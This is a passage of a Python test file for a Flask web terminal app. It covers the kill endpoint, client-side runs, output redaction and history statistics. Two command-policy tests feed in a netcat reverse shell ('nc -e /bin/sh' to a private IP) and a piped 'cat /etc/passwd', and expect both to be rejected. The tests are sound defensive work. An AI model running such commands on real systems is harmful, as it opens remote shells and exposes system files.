             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
             mock.patch("blueprints.run.os.killpg") as killpg:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1", "tab_id": "tab-2"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {"killed": True}
        pid_lookup.assert_called_once_with("run-1", "session-1")
        publish.assert_called_once_with("run-1", "killed", {
            "killer_client_id": "client-2",
            "killer_tab_id": "tab-2",
        })
        killpg.assert_called_once_with(4321, shell_app.signal.SIGTERM)

        team_scope = mock.Mock(team_id="team-1", is_team=True, member={"id": "tmem-killer", "role": "operator"})
        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
             mock.patch("blueprints.run.pid_for_team", return_value=8765) as team_pid_lookup, \
             mock.patch("blueprints.run.publish_run_event") as team_publish, \
             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
             mock.patch("blueprints.run.os.killpg") as team_killpg, \
             mock.patch.object(shell_app.log, "info") as team_info:
            team_resp = client.post(
                "/kill",
                headers={"X-Session-ID": "member-session", "X-Team-ID": "team-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-team", "tab_id": "tab-2"},
            )
        assert team_resp.status_code == 200
        team_pid_lookup.assert_called_once_with("run-team", "team-1")
        team_publish.assert_called_once_with("run-team", "killed", {
            "killer_client_id": "client-2",
            "killer_tab_id": "tab-2",
        })
        team_killpg.assert_called_once_with(8765, shell_app.signal.SIGTERM)
        kill_extra = next(c.kwargs["extra"] for c in team_info.call_args_list if c.args and c.args[0] == "RUN_KILL")
        assert kill_extra["team_id"] == "team-1"
        assert kill_extra["actor_member_id"] == "tmem-killer"
        assert kill_extra["team_role"] == "operator"

    def test_kill_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_for_session", return_value=None) as pid_lookup, \
             mock.patch("blueprints.run.publish_run_event") as publish:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1"},
            )
        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "No such process"}
        pid_lookup.assert_called_once_with("run-1", "session-1")
        publish.assert_not_called()

        viewer_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
        with mock.patch("blueprints.run.current_request_scope", return_value=viewer_scope), \
             mock.patch("blueprints.run.pid_for_team") as team_pid_lookup:
            viewer_resp = client.post(
                "/kill",
                headers={"X-Session-ID": "viewer-session", "X-Team-ID": "team-1"},
                json={"run_id": "run-team"},
            )

        assert viewer_resp.status_code == 403
        assert json.loads(viewer_resp.data)["error"] == "team_forbidden"
        team_pid_lookup.assert_not_called()

    def test_disallowed_command_returns_403(self):
        client = get_client()
        # Patch in commands' namespace — is_command_allowed calls load_command_policy
        # from commands' own namespace, not from app's.
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
        assert resp.status_code == 403

    def test_shell_operator_returns_403(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
        assert resp.status_code == 403

    def test_non_json_body_handled(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            resp = client.post("/runs", data="not json", content_type="text/plain")
        # Should not crash — Flask returns 400 or 415 for bad content type
        assert resp.status_code in (400, 415, 500)

    def test_client_side_run_persists_terminal_native_builtin(self):
        client = get_client()
        session = "client-run-" + uuid.uuid4().hex[:8]
        try:
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [
                        {"text": "Available themes:", "cls": "builtin-section"},
                        {"text": "Dark themes:", "cls": "builtin-section"},
                    ],
                },
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["ok"] is True
            assert data["output_line_count"] == 2

            history = json.loads(
                client.get(
                    "/history?type=runs&include_total=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert history["runs"][0]["command"] == "theme list"
            assert history["runs"][0]["run_kind"] == "builtin"
            assert history["total_count"] == 1

            run_id = history["runs"][0]["id"]
            detail = json.loads(
                client.get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert detail["command"] == "theme list"
            assert detail["output"] == ["Available themes:", "Dark themes:"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_redacts_output_before_search_and_entity_capture(self):
        client = get_client()
        session = "client-run-redaction-" + uuid.uuid4().hex[:8]
        fake_classifier = mock.Mock()
        fake_classifier.classify_line.return_value = {
            "command_root": "theme",
            "line_index": 0,
            "entities": [
                {
                    "type": "cve",
                    "value": "CVE-2026-1234",
                    "canonical_value": "CVE-2026-1234",
                    "confidence": "high",
                    "source_line": 0,
                    "start": 8,
                    "end": 21,
                }
            ],
        }
        try:
            with mock.patch("blueprints.run.OutputSignalClassifier", return_value=fake_classifier):
                resp = client.post(
                    "/run/client",
                    headers={"X-Session-ID": session},
                    json={
                        "command": "theme current",
                        "exit_code": 0,
                        "lines": [{
                            "text": "Finding CVE-2026-1234 reported by admin@example.com",
                            "cls": "builtin-section",
                        }],
                    },
                )
            data = json.loads(resp.data)
            with db_connect() as conn:
                row = conn.execute(
                    "SELECT output_preview, output_search_text FROM runs WHERE id = ?",
                    (data["run_id"],),
                ).fetchone()
                entity_rows = conn.execute(
                    "SELECT e.type, e.canonical_value "
                    "FROM entity_run_links erl JOIN entities e ON e.id = erl.entity_id "
                    "WHERE erl.run_id = ?",
                    (data["run_id"],),
                ).fetchall()
            preview = json.loads(row["output_preview"])
            output_search_text = str(row["output_search_text"] or "")

            assert resp.status_code == 200
            assert preview[0]["text"] == "Finding CVE-2026-1234 reported by [email-redacted]"
            assert "admin@example.com" not in output_search_text
            assert "[email-redacted]" in output_search_text
            assert [(item["type"], item["canonical_value"]) for item in entity_rows] == [
                ("cve", "CVE-2026-1234")
            ]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "DELETE FROM entity_run_links WHERE run_id IN (SELECT id FROM runs WHERE session_id = ?)",
                (session,),
            )
            conn.execute("DELETE FROM entities WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_can_offload_search_text_and_delete_it_with_run(self):
        from services.storage import body_store

        client = get_client()
        session = "client-run-offload-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"runs_search_text_inline_max_bytes": 1}):
            offloaded_line = "Available themes: " + ("x" * 4100) + " needle-after-pointer-preview"
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [{"text": offloaded_line, "cls": "builtin-section"}],
                },
            )
            run_id = json.loads(resp.data)["run_id"]
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT output_search_text FROM runs WHERE id = ?",
                    (run_id,),
                ).fetchone()["output_search_text"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            detail = json.loads(
                client.get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            search_resp = client.get(
                "/history?q=needle-after-pointer-preview&scope=all&include_total=1",
                headers={"X-Session-ID": session},
            )
            search_data = json.loads(search_resp.data)
            delete_resp = client.delete(f"/history/{run_id}", headers={"X-Session-ID": session})

            assert resp.status_code == 200
            assert detail["output"] == [offloaded_line]
            assert search_resp.status_code == 200
            assert search_data["total_count"] == 1
            assert search_data["runs"][0]["id"] == run_id
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_client_side_run_applies_preview_byte_cap(self):
        client = get_client()
        session = "client-run-preview-cap-" + uuid.uuid4().hex[:8]
        huge_line = "Current theme: " + ("x" * 1000)
        with mock.patch.dict("blueprints.run.CFG", {"max_output_lines": 50, "output_preview_max_bytes": 140}):
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme current",
                    "exit_code": 0,
                    "lines": [{"text": huge_line, "cls": "builtin-section"}],
                },
            )
        try:
            data = json.loads(resp.data)
            with db_connect() as conn:
                row = conn.execute(
                    "SELECT output_preview, preview_truncated, output_line_count FROM runs WHERE id = ?",
                    (data["run_id"],),
                ).fetchone()
            preview = json.loads(row["output_preview"])

            assert resp.status_code == 200
            assert data["output_line_count"] == 1
            assert row["output_line_count"] == 1
            assert row["preview_truncated"] == 1
            assert len(preview) == 1
            assert preview[0]["text"].endswith("[preview line truncated]")
            assert huge_line not in preview[0]["text"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_persists_tour_builtin(self):
        client = get_client()
        session = "client-tour-" + uuid.uuid4().hex[:8]
        try:
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "tour",
                    "exit_code": 0,
                    "lines": [
                        {"text": "Running commands", "cls": "builtin-section"},
                        {"text": "dig darklab.sh A", "cls": "builtin-help-row"},
                    ],
                },
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["ok"] is True

            history = json.loads(
                client.get(
                    "/history?type=runs&include_total=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert history["runs"][0]["command"] == "tour"
            assert history["total_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_does_not_link_to_active_project(self):
        client = get_client()
        session = "client-run-project-" + uuid.uuid4().hex[:8]
        project_resp = client.post(
            "/projects",
            headers={"X-Session-ID": session},
            json={"name": "Client Project"},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            "/projects/active",
            headers={"X-Session-ID": session},
            json={"project_id": project["id"]},
        )

        resp = client.post(
            "/run/client",
            headers={"X-Session-ID": session},
            json={
                "command": "theme current",
                "exit_code": 0,
                "lines": [{"text": "Current theme: darklab", "cls": "builtin-section"}],
            },
        )
        assert resp.status_code == 200

        conn = sqlite3.connect(DB_PATH)
        try:
            row = conn.execute(
                "SELECT l.entity_type, l.source, r.command "
                "FROM project_links l JOIN runs r ON r.id = l.entity_id "
                "WHERE l.project_id = ?",
                (project["id"],),
            ).fetchone()
        finally:
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()
        assert row is None

    def test_client_side_run_rejects_non_client_builtin_root(self):
        client = get_client()
        resp = client.post(
            "/run/client",
            json={
                "command": "ping darklab.sh",
                "exit_code": 0,
                "lines": [],
            },
        )
        assert resp.status_code == 403


# ── /history ──────────────────────────────────────────────────────────────────

class TestHistoryRoute:
    def test_get_returns_200(self):
        client = get_client()
        resp = client.get("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200

    def test_get_returns_runs_list(self):
        client = get_client()
        data = json.loads(
            client.get("/history", headers={"X-Session-ID": "test-session"}).data
        )
        assert "items" in data
        assert isinstance(data["items"], list)
        assert "runs" in data
        assert isinstance(data["runs"], list)
        assert "roots" in data
        assert isinstance(data["roots"], list)

    def test_stats_returns_compact_session_counters(self):
        client = get_client()
        session = "history-stats-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-ok", f"{session}-fail", f"{session}-terminated", f"{session}-active"]
        snapshot_id = f"{session}-snapshot"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00",
                 "2026-01-01T00:00:10", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00",
                 "2026-01-01T00:01:20", 1, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00",
                 "2026-01-01T00:02:15", -15, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", "2026-01-01T00:03:00", None, None, "[]"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                (snapshot_id, session, "snap", "2026-01-01T00:03:00", "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "nmap -sT ip.darklab.sh"),
            )
            conn.commit()
            data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)
            assert data["runs"]["total"] == 4
            assert data["runs"]["succeeded"] == 1
            assert data["runs"]["failed"] == 1
            assert data["runs"]["incomplete"] == 1
            assert abs(data["runs"]["average_elapsed_seconds"] - 15.0) < 0.01
            assert data["snapshots"] == 1
            assert data["starred_commands"] == 1
            assert isinstance(data["active_runs"], int)
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id IN (?, ?, ?, ?)", run_ids)
                conn.execute("DELETE FROM snapshots WHERE id = ?", (snapshot_id,))
                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
                conn.commit()

    def test_stats_tolerates_missing_optional_counter_tables(self):
        client = get_client()
        session = "history-stats-missing-tables-" + uuid.uuid4().hex[:8]
        run_id = f"{session}-ok"
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (
                        run_id,
                        session,
                        "nmap -sT ip.darklab.sh",
                        "2026-01-01T00:00:00",
                        "2026-01-01T00:00:10",
                        0,
                        "[]",
                    ),
                )
                conn.execute(
                    "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                    (f"{session}-snapshot", session, "snap", "2026-01-01T00:00:00", "[]"),
                )
                conn.execute(
                    "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                    (session, "nmap -sT ip.darklab.sh"),
                )
                conn.commit()

            with mock.patch("blueprints.history._history_table_exists", return_value=False):
                data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)

            assert data["runs"]["total"] == 1
            assert data["runs"]["succeeded"] == 1
            assert data["snapshots"] == 0
            assert data["starred_commands"] == 0
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
                conn.commit()

    def test_insights_empty_session_and_explicit_day_clamps(self):
        client = get_client()
        session = "history-insights-empty-" + uuid.uuid4().hex[:8]

        auto = json.loads(client.get("/history/insights?days=auto", headers={"X-Session-ID": session}).data)
        assert auto["days"] == 28
        assert len(auto["activity"]) == 28
        assert auto["first_run_date"] is None
        assert auto["command_mix"] == []
        assert auto["constellation"] == []
        assert auto["events"] == []
        assert auto["windows"]["activity"]["total_runs"] == 0
        assert auto["windows"]["command_mix"]["days"] == 90
        assert auto["windows"]["command_mix"]["sparse"] is True
        assert auto["windows"]["constellation"]["days"] == 90
        assert auto["windows"]["constellation"]["sparse"] is True

        long_window = json.loads(client.get("/history/insights?days=999", headers={"X-Session-ID": session}).data)
        assert long_window["days"] == 365
        assert len(long_window["activity"]) == 365
        assert long_window["windows"]["activity"]["days"] == 365

    def test_insights_returns_visual_history_payloads(self):
        client = get_client()
        session = "history-insights-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-curl",
            f"{session}-terminated",
            f"{session}-sleep",
            f"{session}-old",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_sixty = (now - timedelta(days=60)).isoformat()
        day_ten = (now - timedelta(days=10)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        today = now.isoformat()
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[4], session, "whois old.darklab.sh", day_sixty,
                 (now - timedelta(days=60, seconds=-2)).isoformat(), 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", day_ten,
                 (now - timedelta(days=10, seconds=-10)).isoformat(), 0, "[]", 12),
            )
            conn.execute(
                "INSERT INTO run_output_summary (run_id, family, value, count) VALUES (?, 'kind', 'error', 1)",
                (run_ids[0],),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-5)).isoformat(), 1, "[]", 4),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-15)).isoformat(), -15, "[]", 2),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", today, None, None, "[]", 0),
            )
            conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            assert data["days"] == 61
            assert len(data["activity"]) == 61
            assert data["start_date"] == (now - timedelta(days=60)).date().isoformat()
            assert data["first_run_date"] == (now - timedelta(days=60)).date().isoformat()
            assert data["windows"]["activity"]["days"] == 61
            assert data["windows"]["command_mix"]["days"] == 90
            assert data["windows"]["constellation"]["days"] == 90
            assert data["windows"]["command_mix"]["sparse"] is True
            assert data["windows"]["constellation"]["sparse"] is True
            assert data["max_day_count"] >= 1
            roots = {item["root"]: item for item in data["command_mix"]}
            assert roots["nmap"]["count"] == 1
            assert roots["nmap"]["succeeded"] == 1
            assert roots["curl"]["failed"] == 1
            assert roots["ping"]["count"] == 1
            assert roots["ping"]["failed"] == 0
            assert roots["whois"]["count"] == 1
            assert any(item["root"] == "nmap" for item in data["constellation"])
            nmap_constellation = next(item for item in data["constellation"] if item["root"] == "nmap")
            assert nmap_constellation["max_kind"] == "error"
            assert data["events"][0]["root"] == "sleep"

            fixed = json.loads(client.get("/history/insights?days=7", headers={"X-Session-ID": session}).data)
            assert fixed["days"] == 28
            assert len(fixed["activity"]) == 28
            assert fixed["windows"]["activity"]["days"] == 28
            assert fixed["windows"]["command_mix"]["days"] == 90
            assert any(item["root"] == "nmap" for item in fixed["command_mix"])
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM run_output_summary WHERE run_id = ?", [(run_id,) for run_id in run_ids])
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_insights_falls_back_to_other_when_command_registry_fails(self):
        client = get_client()
        session = "history-insights-category-fallback-" + uuid.uuid4().hex[:8]
        run_id = f"{session}-nmap"
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        run_id,
                        session,
                        "nmap -sT ip.darklab.sh",
                        now.isoformat(),
                        (now + timedelta(seconds=2)).isoformat(),
                        0,
                        "[]",
                        4,
                    ),
                )
                conn.commit()

            with mock.patch("services.commands.registry.load_commands_registry", side_effect=RuntimeError("registry down")):
                data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)

            assert data["command_mix"][0]["root"] == "nmap"
            assert data["command_mix"][0]["category"] == "Other"
            assert data["constellation"][0]["category"] == "Other"
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.commit()

    def test_insights_adaptive_windows_switch_at_command_and_constellation_thresholds(self):
        client = get_client()
        session_25 = "history-insights-window-25-" + uuid.uuid4().hex[:8]
        session_40 = "history-insights-window-40-" + uuid.uuid4().hex[:8]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)

        def insert_runs(conn, session, count):
            for index in range(count):
                started = now - timedelta(days=index % 20, minutes=index)
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        f"{session}-{index}",
                        session,
                        f"nmap -sT 198.51.100.{index % 250}",
                        started.isoformat(),
                        (started + timedelta(seconds=1)).isoformat(),
                        0,
                        "[]",
                        index + 1,
                    ),
                )

        try:
            with sqlite3.connect(DB_PATH) as conn:
                insert_runs(conn, session_25, 25)
                insert_runs(conn, session_40, 40)
                conn.commit()

            data_25 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_25}).data)
            assert data_25["windows"]["command_mix"]["days"] == 30
            assert data_25["windows"]["command_mix"]["total_runs"] == 25
            assert data_25["windows"]["command_mix"]["sparse"] is False
            assert data_25["windows"]["constellation"]["days"] == 90
            assert data_25["windows"]["constellation"]["total_runs"] == 25
            assert data_25["windows"]["constellation"]["sparse"] is True

            data_40 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_40}).data)
            assert data_40["windows"]["command_mix"]["days"] == 30
            assert data_40["windows"]["constellation"]["days"] == 30
            assert data_40["windows"]["constellation"]["total_runs"] == 40
            assert data_40["windows"]["constellation"]["plotted_runs"] == 40
            assert data_40["windows"]["constellation"]["sparse"] is False
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session_25, session_40))
                conn.commit()

    def test_insights_filters_app_builtin_commands(self):
        # The Status Monitor's constellation, treemap, heatmap, events, and
        # max_day_count must all exclude synthetic app built-ins (pwd, whoami,
        # help, ...) so the visualizations reflect real recon work only.
        client = get_client()
        session = "history-insights-builtin-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-pwd",
            f"{session}-whoami",
            f"{session}-help",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_two = (now - timedelta(days=2)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[0], session, "nmap -sT ip.darklab.sh", day_two,
                     (now - timedelta(days=2, seconds=-30)).isoformat(), 0, "[]", 12),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[1], session, "pwd", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[2], session, "whoami", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
                    "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
                    (run_ids[3], session, "help", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
                )
                conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            mix_roots = {item["root"] for item in data["command_mix"]}
            constellation_roots = {item["root"] for item in data["constellation"]}
            event_roots = {item["root"] for item in data["events"]}
            assert "nmap" in mix_roots
            assert "nmap" in constellation_roots
            assert "nmap" in event_roots
            for builtin in ("pwd", "whoami", "help"):
                assert builtin not in mix_roots
                assert builtin not in constellation_roots
                assert builtin not in event_roots
            day_two_key = (now - timedelta(days=2)).date().isoformat()
            day_one_key = (now - timedelta(days=1)).date().isoformat()
            day_counts = {entry["date"]: entry["count"] for entry in data["activity"]}
            assert day_counts.get(day_two_key) == 1
            assert day_counts.get(day_one_key, 0) == 0
            assert data["max_day_count"] == 1
            assert data["windows"]["constellation"]["total_runs"] == 1
            assert data["windows"]["constellation"]["plotted_runs"] == 1
            assert data["windows"]["command_mix"]["total_runs"] == 1
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_delete_all_returns_ok(self):
        client = get_client()
        resp = client.delete("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_delete_specific_nonexistent_run_returns_ok(self):
        # Deleting a run_id that doesn't exist should still return ok (idempotent)
        client = get_client()
        resp = client.delete(
            "/history/nonexistent-run-id",
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_bulk_history_export_and_delete_report_partial_results(self):
        import gzip

        from services.runs.output_store import (
            RUN_OUTPUT_ARTIFACT_FORMAT_VERSION,
            RUN_OUTPUT_DIR,
            ensure_run_output_dir,
        )

        client = get_client()
        session_id = "bulk-delete-session"
        owned_run_id = "run-" + uuid.uuid4().hex
        full_run_id = "run-" + uuid.uuid4().hex
        fallback_run_id = "run-" + uuid.uuid4().hex
        large_run_id = "run-" + uuid.uuid4().hex
        incomplete_run_id = "run-" + uuid.uuid4().hex
        running_run_id = "run-" + uuid.uuid4().hex
        other_run_id = "run-" + uuid.uuid4().hex
        missing_run_id = "run-" + uuid.uuid4().hex
        full_rel_path = f"{full_run_id}.txt.gz"
        fallback_rel_path = f"{fallback_run_id}.txt.gz"
        full_artifact_path = Path(RUN_OUTPUT_DIR) / full_rel_path
        fallback_artifact_path = Path(RUN_OUTPUT_DIR) / fallback_rel_path
        ensure_run_output_dir()
        with gzip.open(full_artifact_path, "wt", encoding="utf-8") as artifact:
            artifact.write(json.dumps({
                "v": RUN_OUTPUT_ARTIFACT_FORMAT_VERSION,
                "created": "2026-05-28T00:00:00Z",
                "run_id": full_run_id,
            }, separators=(",", ":")) + "\n")
            artifact.write(json.dumps({"text": "full artifact one"}, separators=(",", ":")) + "\n")
            artifact.write(json.dumps({"text": "full artifact two"}, separators=(",", ":")) + "\n")
        fallback_artifact_path.write_bytes(b"not a gzip transcript")
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1)",
                (owned_run_id, session_id, "nmap darklab.sh", json.dumps([{"text": "443/tcp open https"}])),
            )
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, command, started, finished, exit_code, output_preview, output_line_count, "
                "full_output_available, full_output_truncated) "
                "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 2, 1, 0)",
                (
                    full_run_id,
                    session_id,
                    "cat full-output.txt",
                    json.dumps([{"text": "preview should not export"}]),
                ),
            )
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, command, started, finished, exit_code, output_preview, output_line_count, "
                "full_output_available, full_output_truncated) "
                "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1, 1, 0)",
                (
                    fallback_run_id,
                    session_id,
                    "cat fallback-output.txt",
                    json.dumps([{"text": "fallback preview"}]),
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1)",
                (
                    large_run_id,
                    session_id,
                    "cat large-output.txt",
                    json.dumps([{"text": "x" * 1000}]),
                ),
            )
            conn.execute(
                "INSERT INTO run_output_artifacts "
                "(run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, 2, 0, datetime('now'))",
                (full_run_id, full_rel_path, full_artifact_path.stat().st_size),
            )
            conn.execute(
                "INSERT INTO run_output_artifacts "
